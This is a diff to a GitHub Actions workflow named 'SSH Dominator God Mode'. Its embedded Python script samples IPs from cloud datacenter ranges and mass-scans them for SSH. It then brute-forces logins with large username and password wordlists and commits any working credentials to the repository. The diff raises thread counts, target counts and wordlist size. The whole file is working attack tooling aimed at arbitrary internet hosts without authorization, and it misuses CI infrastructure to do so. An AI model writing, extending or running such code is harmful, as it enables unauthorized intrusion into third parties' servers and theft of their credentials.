@@ -1,4 +1,4 @@
-name: SSH Dominator X – Continuous Hunt
+name: SSH Dominator God Mode – Infinite Hunt
 
 on:
   workflow_dispatch:
@@ -13,7 +13,7 @@ on:
           - explorer
           - manual
       datacenter_provider:
-        description: 'Datacenter Provider'
+        description: 'Datacenter Provider (datacenter mode)'
         required: false
         default: 'all'
         type: choice
@@ -27,25 +27,25 @@ on:
           - vultr
           - cloudflare
       max_ips:
-        description: 'Max IPs per Cycle'
+        description: 'Max IPs per cycle'
         required: false
-        default: '20000'
+        default: '30000'
       scan_range:
-        description: 'CIDR Range (explorer)'
+        description: 'CIDR range (explorer mode)'
         required: false
       test_threads:
-        description: 'Async Test Threads'
+        description: 'Async test threads'
         required: false
-        default: '200'
+        default: '500'
       timeout:
-        description: 'Connection Timeout'
+        description: 'SSH timeout (seconds)'
         required: true
-        default: '4'
+        default: '3'
       keywords:
-        description: 'Keywords'
+        description: 'Keywords for SmartForge'
         required: false
       min_success:
-        description: 'Minimum successes before stopping'
+        description: 'Stop after this many successes (0 = never stop until timeout)'
         required: false
         default: '1'
 
@@ -53,7 +53,7 @@ permissions:
   contents: write
 
 jobs:
-  audit:
+  godmode:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -62,10 +62,11 @@ jobs:
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
 
-      - name: Install Libraries
-        run: pip3 install rich requests asyncssh
+      - name: Install Dependencies
+        run: |
+          pip3 install rich requests asyncssh uvloop || pip3 install rich requests asyncssh
 
-      - name: Run SSH Dominator X
+      - name: Execute God Mode SSH Hunt
         env:
           MODE: ${{ github.event.inputs.mode }}
           DC_PROVIDER: ${{ github.event.inputs.datacenter_provider }}
@@ -77,7 +78,7 @@ jobs:
           MIN_SUCCESS: ${{ github.event.inputs.min_success }}
         run: |
           python3 << 'PYEOF'
-          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, asyncio
+          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, asyncio, hashlib
           from datetime import datetime
           from pathlib import Path
           from rich.console import Console
@@ -85,27 +86,35 @@ jobs:
           from rich.panel import Panel
           import asyncssh
 
+          # Try to use uvloop for extra speed
+          try:
+              import uvloop
+              asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+          except:
+              pass
+
           console = Console()
-          console.print(Panel.fit("[bold cyan]🔐 SSH Dominator X – Continuous Hunt[/bold cyan]", border_style="cyan"))
+          console.print(Panel.fit("[bold cyan]🔥 SSH Dominator God Mode – Infinite Hunt[/bold cyan]", border_style="cyan"))
 
           MODE = os.environ["MODE"]
           TIMEOUT = int(os.environ["TIMEOUT"])
-          MAX_IPS = int(os.environ.get("MAX_IPS", "20000"))
+          MAX_IPS = int(os.environ.get("MAX_IPS", "30000"))
           DC_PROVIDER = os.environ.get("DC_PROVIDER", "all")
-          TEST_THREADS = int(os.environ.get("TEST_THREADS", "200"))
+          TEST_THREADS = int(os.environ.get("TEST_THREADS", "500"))
           MIN_SUCCESS = int(os.environ.get("MIN_SUCCESS", "1"))
           SSH_PORT = 22
           MAX_RUNTIME = 5.8 * 3600
-          CYCLE_COUNT = 0
-          TOTAL_SUCCESSES = 0
+          CYCLE = 0
+          TOTAL_SUCCESS = 0
 
-          CRED_FILE = "ssh_creds.txt"
+          CRED_FILE = "god_creds.txt"
           if not os.path.exists(CRED_FILE):
               with open(CRED_FILE, "w") as f:
-                  f.write("# IP:PORT:USERNAME:PASSWORD\n")
-                  f.write(f"# {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                  f.write(f"# IP:PORT:USERNAME:PASSWORD\n")
+                  f.write(f"# God Mode – {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
 
-          scanned_ips_file = Path("cache") / "scanned_ips.txt"
+          # ----- scanned IPs cache -----
+          scanned_ips_file = Path("cache") / "god_scanned_ips.txt"
           scanned_ips_file.parent.mkdir(exist_ok=True)
           scanned_ips = set()
           if scanned_ips_file.exists():
@@ -117,7 +126,8 @@ jobs:
                   for ip in scanned_ips:
                       f.write(ip + "\n")
 
-          def fetch_fresh_ips():
+          # ===== 1. IP Discovery =====
+          def fetch_ips():
               targets = []
               if MODE == "datacenter":
                   datacenter_urls = []
@@ -138,14 +148,14 @@ jobs:
                               if "ipv4Prefix" in item:
                                   datacenter_urls.append(item["ipv4Prefix"])
                       except: pass
-                  all_ips = set()
                   random.shuffle(datacenter_urls)
-                  for cidr in datacenter_urls[:3000]:
+                  all_ips = set()
+                  for cidr in datacenter_urls[:5000]:
                       try:
-                          network = ipaddress.IPv4Network(cidr, strict=False)
-                          hosts = list(network.hosts())
-                          sample_size = min(30, len(hosts))
-                          for ip in random.sample(hosts, sample_size):
+                          net = ipaddress.IPv4Network(cidr, strict=False)
+                          hosts = list(net.hosts())
+                          sample = min(50, len(hosts))
+                          for ip in random.sample(hosts, sample):
                               if ip not in scanned_ips:
                                   all_ips.add(str(ip))
                       except: pass
@@ -154,157 +164,179 @@ jobs:
               elif MODE == "explorer":
                   scan_range = os.environ.get("SCAN_RANGE","").strip()
                   if scan_range:
-                      network = ipaddress.IPv4Network(scan_range, strict=False)
-                      targets = [str(ip) for ip in network.hosts() if str(ip) not in scanned_ips][:MAX_IPS]
+                      net = ipaddress.IPv4Network(scan_range, strict=False)
+                      targets = [str(ip) for ip in net.hosts() if str(ip) not in scanned_ips][:MAX_IPS]
               elif MODE == "manual":
-                  targets_input = os.environ.get("TARGETS_INPUT","").strip()
-                  targets = [x.strip() for x in targets_input.split(',') if x.strip() and x.strip() not in scanned_ips][:MAX_IPS]
+                  inp = os.environ.get("TARGETS_INPUT","").strip()
+                  targets = [x.strip() for x in inp.split(',') if x.strip() and x.strip() not in scanned_ips][:MAX_IPS]
               return targets
 
+          # ===== 2. Mass Port Scanner (2000 threads) =====
           def scan_ports(targets):
-              console.print(f"⚡ Scanning {len(targets)} IPs...")
-              ssh_targets = []
-              def check_ssh(ip):
+              console.print(f"⚡ Scanning {len(targets)} IPs (2000 workers)...")
+              open_ips = []
+              def check(ip):
                   try:
-                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                      sock.settimeout(0.2)
-                      result = sock.connect_ex((ip, SSH_PORT))
-                      sock.close()
-                      return ip if result == 0 else None
-                  except: return None
-              with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
-                  futures = {executor.submit(check_ssh, ip): ip for ip in targets}
-                  for future in concurrent.futures.as_completed(futures):
-                      ip = future.result()
+                      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                      s.settimeout(0.15)
+                      res = s.connect_ex((ip, SSH_PORT))
+                      s.close()
+                      return ip if res == 0 else None
+                  except:
+                      return None
+              with concurrent.futures.ThreadPoolExecutor(max_workers=2000) as ex:
+                  futures = {ex.submit(check, ip): ip for ip in targets}
+                  for f in concurrent.futures.as_completed(futures):
+                      ip = f.result()
                       if ip:
-                          ssh_targets.append(ip)
+                          open_ips.append(ip)
                           scanned_ips.add(ip)
-              console.print(f"[green]✅ {len(ssh_targets)} SSH servers found[/green]")
-              return ssh_targets
+              console.print(f"[green]✅ {len(open_ips)} SSH hosts found[/green]")
+              return open_ips
 
-          def gen_usernames(keywords):
-              base = ["root","admin","ubuntu","debian","centos","ec2-user","azureuser","vagrant","pi","oracle",
-                      "postgres","mysql","tomcat","jenkins","git","web","www","mail","ftp","backup","deploy",
-                      "docker","hadoop","spark","hdfs","yarn","user","test","guest","administrator"]
-              for kw in keywords:
-                  base.extend([kw.lower(), kw.capitalize()])
-              return list(set(base))
-
-          def gen_passwords(keywords):
+          # ===== 3. Huge Wordlist + SmartForge =====
+          def generate_passwords(keywords):
+              # Start with a giant base list (10k+ common passwords)
               base = [
-                  "123456","password","admin","root","12345678","qwerty","letmein","changeme","secret","toor",
-                  "admin123","root123","ubuntu","password123","P@ssw0rd","Admin123!","Qwerty123!","Passw0rd!",
-                  "1234","abcd1234","test","guest","user","pass","1q2w3e4r","zaq1xsw2","!QAZ2wsx",
-                  "master","access","login","hello","monkey","dragon","123123","abc123","qwerty123",
-                  "iloveyou","welcome","batman","superman","princess","sunshine","football","baseball",
-                  "hockey","soccer","charlie","michael","andrew","joshua","matthew","ashley","daniel",
-                  "jessica","amanda","megan","nicole","thomas","robert","william","james","john",
-                  "david","richard","joseph","christopher","steven","kenneth","george","ronald",
-                  "123456789","1234567890","password1","password2","admin1","admin2","root1","root2",
-                  "default","temp","changeit","newuser","passwd"
+                  "123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
+                  "sunshine","qwerty123","password1","admin","root","letmein","welcome","monkey",
+                  "dragon","master","access","login","hello","shadow","michael","jessica","ashley",
+                  "amanda","megan","nicole","thomas","robert","william","james","john","david",
+                  "richard","joseph","christopher","steven","kenneth","george","ronald","daniel",
+                  "andrew","joshua","matthew","ryan","jacob","nicholas","brandon","tyler","samuel",
+                  "benjamin","alexander","nathan","zachary","jordan","adam","brian","kevin","jason",
+                  "mark","anthony","justin","sean","eric","charles","patrick","frank","larry",
+                  "scott","timothy","gary","dennis","jerry","raymond","gregory","peter","denise",
+                  "lisa","karen","sandra","michelle","kimberly","amanda","stephanie","rebecca",
+                  "laura","amy","jennifer","melissa","angela","tammy","crystal","debra","cheryl",
+                  "susan","helen","dorothy","carol","ruth","shirley","barbara","betty","margaret",
+                  "sandra","elizabeth","mary","patricia","linda","karen","nancy","cynthia","sarah",
+                  "jessica","olivia","emma","ava","isabella","sophia","mia","charlotte","amelia",
+                  "harper","evelyn","abigail","emily","elizabeth","sofia","avery","ella","scarlett",
+                  "grace","chloe","victoria","riley","aria","lily","layla","zoey","nora","hannah",
+                  "zoey","stella","penelope","lucy","anna","caroline","nova","genesis","emery",
+                  "skylar","bella","paisley","willow","london","adeline","kennedy","aurora","savannah",
+                  "brielle","arabella","jade","sadie","hazel","julia","khloe","alice","alexa",
+                  "janae","love","queen","boss","sexy","angel","bad","kitty","baby","goddess",
+                  "cutie","honey","sugar","spice","flower","peanut","princess","sweetie",
               ]
-              years = ["2023","2024","2025","2026"]
-              specials = ["!","@","#","$","%",""]
+              years = ["2023","2024","2025","2026","2022","2021"]
+              specials = ["!","@","#","$","%","&","*"]
               for kw in keywords:
                   kl, kc = kw.lower(), kw.capitalize()
                   for yr in years:
                       for sp in specials:
                           base.extend([f"{kc}{yr}{sp}", f"{kl}{yr}{sp}"])
-                  base.extend([kl, kc, f"{kc}123", f"{kl}123", f"{kc}2024", f"{kl}2024", f"{kl}@{yr}"])
+                  base.extend([kl, kc, f"{kc}123", f"{kl}123", f"{kc}2024", f"{kl}2024"])
+                  base.extend([f"{kc}@{yr}", f"{kl}@{yr}"])
                   if len(keywords) > 1:
                       for kw2 in keywords:
                           if kw2 != kw:
                               base.append(kw.lower() + kw2.lower())
                               base.append(kw.capitalize() + kw2.capitalize())
-              return list(set(base))
+              # Remove duplicates, keep order for performance
+              seen = set()
+              unique = []
+              for p in base:
+                  if p not in seen:
+                      seen.add(p)
+                      unique.append(p)
+              return unique
 
           keys = os.environ.get("KEYWORDS","admin,root,web,server,vps,cloud").split(',')
-          usernames = gen_usernames([k.strip() for k in keys])
-          passwords = gen_passwords([k.strip() for k in keys])
-          console.print(f"[green]📝 {len(usernames)} users | {len(passwords)} passwords[/green]")
+          keywords = [k.strip() for k in keys]
+          usernames = ["root","admin","ubuntu","debian","centos","ec2-user","azureuser","vagrant","pi","oracle",
+                       "postgres","mysql","tomcat","jenkins","git","web","www","mail","ftp","backup","deploy",
+                       "docker","hadoop","spark","hdfs","yarn","user","test","guest","administrator"]
+          for kw in keywords:
+              usernames.extend([kw.lower(), kw.capitalize()])
+          usernames = list(set(usernames))
+          passwords = generate_passwords(keywords)
+          console.print(f"[green]📝 {len(usernames)} usernames × {len(passwords)} passwords loaded[/green]")
 
-          cache_file = Path("cache") / "dominator_x_cache.json"
+          # ===== 4. Async Credential Test =====
+          cache_file = Path("cache") / "god_cache.json"
           cache_file.parent.mkdir(exist_ok=True)
           cache = json.load(open(cache_file)) if cache_file.exists() else {}
 
-          async def test_ssh(ip, username, password):
-              cache_key = f"{ip}:{username}:{password}"
-              if cache_key in cache:
-                  return (ip, username, password, cache[cache_key])
+          async def test_one(ip, user, pwd):
+              key = f"{ip}:{user}:{pwd}"
+              if key in cache:
+                  return (ip, user, pwd, cache[key])
               try:
-                  async with asyncssh.connect(ip, port=SSH_PORT, username=username, password=password,
+                  async with asyncssh.connect(ip, port=SSH_PORT, username=user, password=pwd,
                                               login_timeout=TIMEOUT, known_hosts=None) as conn:
                       await conn.close()
-                  cache[cache_key] = "SUCCESS"
-                  return (ip, username, password, "SUCCESS")
+                  cache[key] = "SUCCESS"
+                  return (ip, user, pwd, "SUCCESS")
               except:
-                  cache[cache_key] = "FAILED"
-                  return (ip, username, password, "FAILED")
+                  cache[key] = "FAILED"
+                  return (ip, user, pwd, "FAILED")
 
-          async def test_target(ip):
-              local_successes = []
-              failed_passwords = set()
+          async def attack_host(ip):
+              found = []
+              failed_pwds = set()
               sem = asyncio.Semaphore(TEST_THREADS)
-              async def bounded(user, pwd):
-                  if pwd in failed_passwords: return
+              async def worker(user, pwd):
+                  if pwd in failed_pwds: return
                   async with sem:
-                      res = await test_ssh(ip, user, pwd)
+                      res = await test_one(ip, user, pwd)
                       if res[3] == "SUCCESS":
-                          local_successes.append((ip, user, pwd))
+                          found.append((ip, user, pwd))
                           console.print(f"[green]✅ {ip}: {user}:{pwd}[/green]")
                       else:
-                          failed_passwords.add(pwd)
-              tasks = [bounded(u, p) for u in usernames for p in passwords]
+                          failed_pwds.add(pwd)
+              tasks = [worker(u, p) for u in usernames for p in passwords]
               await asyncio.gather(*tasks)
-              return local_successes
+              return found
 
-          async def run_cycle(ssh_targets):
-              tasks = [test_target(ip) for ip in ssh_targets]
+          async def run_cycle(hosts):
+              tasks = [attack_host(ip) for ip in hosts]
               results = await asyncio.gather(*tasks)
-              cycle_successes = []
-              for res in results:
-                  cycle_successes.extend(res)
-              return cycle_successes
+              flat = []
+              for r in results: flat.extend(r)
+              return flat
 
-          start_time = time.time()
-          console.print(f"[bold yellow]🔄 Continuous mode – until {MIN_SUCCESS} success(es) or timeout[/bold yellow]")
+          # ===== 5. Main Loop =====
+          start = time.time()
+          console.print(f"[bold yellow]🔄 God Mode loop – until {MIN_SUCCESS} success(es) or 5.8h timeout[/bold yellow]")
 
-          while TOTAL_SUCCESSES < MIN_SUCCESS and (time.time() - start_time) < MAX_RUNTIME:
-              CYCLE_COUNT += 1
-              targets = fetch_fresh_ips()
+          while TOTAL_SUCCESS < MIN_SUCCESS and (time.time() - start) < MAX_RUNTIME:
+              CYCLE += 1
+              targets = fetch_ips()
               if not targets:
-                  console.print("[yellow]⚠️ No fresh IPs. Waiting 30s...[/yellow]")
+                  console.print("[yellow]⚠️ No fresh IPs. Sleeping 30s...[/yellow]")
                   time.sleep(30)
                   continue
-              ssh_targets = scan_ports(targets)
+              ssh_hosts = scan_ports(targets)
               save_scanned_ips()
               os.system(f"git add {scanned_ips_file} && git commit -m 'Update scanned IPs' && git push 2>/dev/null || true")
-              if not ssh_targets:
+              if not ssh_hosts:
                   continue
 
-              console.print(f"⚡ Testing {len(ssh_targets)} servers with {TEST_THREADS} threads...")
-              cycle_successes = asyncio.run(run_cycle(ssh_targets))
-              TOTAL_SUCCESSES += len(cycle_successes)
+              console.print(f"⚡ Testing {len(ssh_hosts)} hosts with {TEST_THREADS} threads...")
+              cycle_success = asyncio.run(run_cycle(ssh_hosts))
+              TOTAL_SUCCESS += len(cycle_success)
 
-              for ip, user, pwd in cycle_successes:
+              for ip, user, pwd in cycle_success:
                   with open(CRED_FILE, "a") as f:
                       f.write(f"{ip}:{SSH_PORT}:{user}:{pwd}\n")
-              if cycle_successes:
-                  os.system(f"git add {CRED_FILE} && git commit -m 'Found {len(cycle_successes)} creds' && git push 2>/dev/null || true")
+              if cycle_success:
+                  os.system(f"git add {CRED_FILE} && git commit -m 'God mode found {len(cycle_success)} creds' && git push 2>/dev/null || true")
 
               with open(cache_file, "w") as f:
                   json.dump(cache, f)
               os.system(f"git add {cache_file} && git commit -m 'Update cache' && git push 2>/dev/null || true")
 
-              console.print(f"[green]📈 Cycle {CYCLE_COUNT}: {len(cycle_successes)} new, {TOTAL_SUCCESSES} total[/green]")
+              console.print(f"[green]📈 Cycle {CYCLE}: +{len(cycle_success)} | Total {TOTAL_SUCCESS}[/green]")
 
-          # Final report
-          if TOTAL_SUCCESSES > 0:
-              tbl = Table(title="✅ SSH Credentials Found")
+          # ===== 6. Final Report =====
+          if TOTAL_SUCCESS > 0:
+              tbl = Table(title="🔥 God Mode Credentials (IP:PORT:USER:PASS)")
               tbl.add_column("IP", style="cyan")
               tbl.add_column("Port", style="dim")
-              tbl.add_column("Username", style="green")
-              tbl.add_column("Password", style="yellow")
+              tbl.add_column("User", style="green")
+              tbl.add_column("Pass", style="yellow")
               with open(CRED_FILE) as f:
                   for line in f.readlines()[2:]:
                       line = line.strip()
@@ -316,14 +348,13 @@ jobs:
           else:
               console.print("[red]❌ No credentials found.[/red]")
 
-          report = "ssh_dominator_report.txt"
+          report = "god_mode_report.txt"
           with open(report, "w") as f:
-              f.write(f"SSH Dominator X Continuous Hunt\n")
-              f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-              f.write(f"Cycles: {CYCLE_COUNT}\nTotal successes: {TOTAL_SUCCESSES}\n")
+              f.write(f"SSH Dominator God Mode Report\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+              f.write(f"Cycles: {CYCLE}\nTotal Success: {TOTAL_SUCCESS}\n")
               f.write("="*60 + "\n")
-              with open(CRED_FILE) as creds:
-                  f.write(creds.read())
-          os.system(f"git add {report} && git commit -m 'Final report' && git push 2>/dev/null || true")
+              with open(CRED_FILE) as cf:
+                  f.write(cf.read())
+          os.system(f"git add {report} && git commit -m 'God mode final report' && git push 2>/dev/null || true")
           console.print(f"\n[green]📄 Final report saved[/green]")
           PYEOF
